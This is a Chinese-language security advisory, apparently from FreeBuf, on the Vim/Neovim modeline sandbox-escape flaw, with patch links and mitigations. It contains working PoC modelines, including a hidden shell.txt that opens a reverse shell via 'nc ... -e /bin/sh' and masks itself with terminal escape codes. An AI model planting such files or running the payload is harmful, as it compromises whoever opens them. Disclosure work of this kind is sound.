***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

6月4日，名为Arminius的安全研究员在twitter曝光现Vim/Neovim的本地代码执行漏洞，并且还被披露了PoC。作为Linux的上古神器级的文本编辑器使用量还是比较大的，建议用户立刻更新最新补丁。

## 漏洞细节  

命令行功能允许在文件的开头或结尾附近指定自定义编辑器选项。

默认情况下启用此功能并应用于所有文件类型，包括plain .txt。

一个典型的模式：

    
    
    /* vim: set textwidth=80 tabstop=8: */

出于安全原因，在modelines中只允许选项的子集，如果选项值包含表达式，则它在沙箱中执行：

出于安全原因，不支持除“set”之外的其他命令。有人可能会使用modelines创建特洛伊木马文本文件。 并非所有选择可以设定。
对于某些选项，设置了一个标志，以便在使用时使用沙箱是有效的。

<https://github.com/vim/vim/blob/5c017b2de28d19dfa4af58b8973e32f31bb1477e/runtime/doc/options.txt#L582>

沙箱旨在防止副作用：

'foldexpr'，'formatexpr'，'includeexpr'，'indentexpr'，'statusline'和'foldtext'选项可以在沙箱中评估。
这意味着你是保护免受这些具有令人讨厌的副作用的表达。 这给了一些从模式行设置这些选项时的安全性。

<https://github.com/vim/vim/blob/5c017b2de28d19dfa4af58b8973e32f31bb1477e/runtime/doc/eval.txt#L13050>

但是，:source!命令（使用bang [ !]修饰符）可用于绕过沙箱。它从给定文件中读取并执行命令，就像手动键入，在沙箱离开后运行它们一样。

    
    
    :so[urce]! {file}  

从{file}读取Vim命令。 这些是命令从您正常模式执行，就像您输入他们一样。

<https://github.com/vim/vim/blob/5c017b2de28d19dfa4af58b8973e32f31bb1477e/runtime/doc/repeat.txt#L182>

因此，可以简单地构建一个在沙箱外部运行代码的模式行：

    
    
    # vim: set foldexpr=execute('\:source! some_file'):

Neovim还需要一个额外的步骤，即execute()：

在这里，assert_fails()也可以使用，也需要{cmd}参数：

以下模式行使用fold表达式来运行source! %以执行当前文件，该文件又uname -a || "(garbage)"作为shell命令执行：

    
    
    :!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="

此外，仅Neovim功能nvim_input()易受相同方法的影响，例如：

    
    
     vi:fen:fdm=expr:fde=nvim_input("\:terminal\ uname\ -a"):fdl=0

过去，其他与模式相关的漏洞已在Vim中修补（请参阅CVE-2002-1377，CVE-2016-1248）。

##  **POC**

### 第一种：

1、创建poc.txt

    
    
    :!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="

2、确保未禁用modeline选项(:set modeline)

3、在vim中打开该txt

vim poc.txt

然后系统会执行 uname -a

### 第二种：

该PoC描述了一种真实的攻击方法，其中一旦用户打开文件就启动反弹Shell。 为了隐藏攻击，文件将在打开时立即重写。

此外，当使用cat打印内容时，PoC使用终端转义序列来隐藏命令行。而使用cat -v可以显示实际内容。

shell.txt:

    
    
    \x1b[?7l\x1bSNothing here.\x1b:silent! w | call system(\'nohup nc 127.0.0.1 9999 -e /bin/sh &\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x1b[KNothing here."\x16\x1b[D \n

## 视频演示  

**![Image](https://camo.githubusercontent.com/12bccf0112d4c05f2a26ac528f92ae4fe50575fd/68747470733a2f2f692e696d6775722e636f6d2f387734747465582e676966)**

攻击者是右边，被攻击者是左边的机器。

##  **安全建议**

> Vim补丁8.1.1365
>
> <https://github.com/vim/vim/commit/5357552>
>
> Neovim补丁（在v0.3.6中发布）
>
> <https://github.com/neovim/neovim/pull/10082>
>
> <https://github.com/neovim/neovim/releases/tag/v0.3.6>

除了打补丁之外之外，建议在vimrc（set
nomodeline）中禁用model，使用securemodelines插件，或者禁用modelineexpr（因为补丁8.1.1366，仅限Vim）以禁用model中的表达式。

***本文作者：木子，参考来源[github](https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md)，[黑鸟](https://mp.weixin.qq.com/s/f4s7x5MciLDFirSNLlBh3Q)，转载请注明来自FreeBuf.COM**

